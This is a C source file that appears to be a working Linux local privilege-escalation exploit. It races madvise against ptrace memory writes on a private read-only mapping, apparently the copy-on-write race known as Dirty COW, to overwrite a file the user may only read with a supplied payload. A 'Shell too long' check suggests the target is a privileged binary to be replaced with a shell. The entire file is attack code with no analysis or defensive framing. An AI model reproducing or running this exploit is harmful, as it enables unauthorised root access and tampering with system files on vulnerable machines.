#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <wait.h>

struct mem_arg {
  void *offset;
  void *patch;
  off_t patch_size;
  const char *fname;
  volatile int stop;
  volatile int success;
};

int pid;

static void *checkthread(void *arg) {
  struct mem_arg *marg = (struct mem_arg *)arg;

  struct stat st;
  int i;
  char *newdata = malloc(marg->patch_size);
  for (i = 0; i< 1000 && !marg->stop;i++) {
    int f = open(marg->fname, O_RDONLY);
    read (f, newdata, marg->patch_size);
    close(f);

    //printf("%s\n",newdata);
    //printf("%s\n",(char*)marg->patch);


    int cmp = memcmp(newdata, marg->patch, marg->patch_size);
    if (cmp == 0) {
      marg->stop = 1;
      marg->success = 1;
    }
    usleep(100000);
  }
  return NULL;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
  const unsigned char *s;
  unsigned long value;
  unsigned char *d;

  d = dest;
  s = src;
  
  while (n >= sizeof(long)) {
    memcpy(&value, s, sizeof(value));

    errno = 0;
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      printf("pof %d\n",errno);
      return -1;
    }

    n -= sizeof(long);
    d += sizeof(long);
    s += sizeof(long);

    //printf("%d\n",(int)d);
  }

  if (n > 0) {
    d -= sizeof(long) -n;
    errno = 0;
    value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
    if (value == -1 && errno != 0) {
      return -1;
    }

    memcpy ((unsigned char*)&value+sizeof(value) - n, s, n);
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      return -1;
    }
  }
  return 0;
}

static void *ptracethread(void *arg) {
  struct mem_arg *marg = (struct mem_arg *)arg;

  int i,c;
  for (i = 0; i < 250000000 && !marg->stop; i++) {
    c = ptrace_memcpy(pid, marg->offset, marg->patch, marg->patch_size);
  }

  marg->stop = 1;
  return NULL;
}

static void *madvthread(void *arg) {
  struct mem_arg *marg = (struct mem_arg *)arg;
  int i, c =0;

  for (i = 0; i < 256000000 && !marg->stop; i++) {
    c += madvise((void*) (marg->offset), marg->patch_size, MADV_DONTNEED);
  }

  marg->stop = 1;

  printf("%d\n", c);

  return NULL;
}

int main(int argc, const char *argv[]) {
  printf("HEJ\n");
  
  const char * ffile = argv[1];
  const char * tfile = argv[2];

  struct stat st;
  struct stat st2;

  struct mem_arg *marg=(struct mem_arg *)malloc(sizeof(struct mem_arg));

  int f = open(ffile, O_RDONLY);
  int f2 = open(tfile, O_RDONLY);

  fstat(f, &st);
  fstat(f2, &st2);

  size_t size = st.st_size;

  if (size>st2.st_size) {
    printf("Shell too long");
    return 1;
  }

  //size_t orgsize = size;

  //size = st2.st_size;
  
  (*marg).patch = malloc(size);
  (*marg).patch_size = size;

  (*marg).fname = argv[2];

  read(f,(*marg).patch, size);
  close(f);
  printf("%s\n",(char*)marg->patch);

  void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f2, 0);

  if (map == MAP_FAILED) {
    printf("GOGLEA");
    return(-1);
  }

  //printf("%ld\n", (long)map);

  (*marg).offset = map;
  
  marg->stop = 0;
  marg->success = 0;
  pthread_t pt1,pt2;

  pid = fork();
  if (pid) {
    pthread_create(&pt1, NULL, checkthread, marg);
    //printf("%ld\n",ptrace(PTRACE_ATTACH,pid));
    waitpid(pid,NULL,0);
    ptracethread((void*)marg);
    pthread_join(pt1,NULL);
  } else {
    pthread_create(&pt2, NULL, madvthread, marg);
    ptrace(PTRACE_TRACEME);
    kill(getpid(),SIGSTOP);
    pthread_join(pt2,NULL);
  }
}
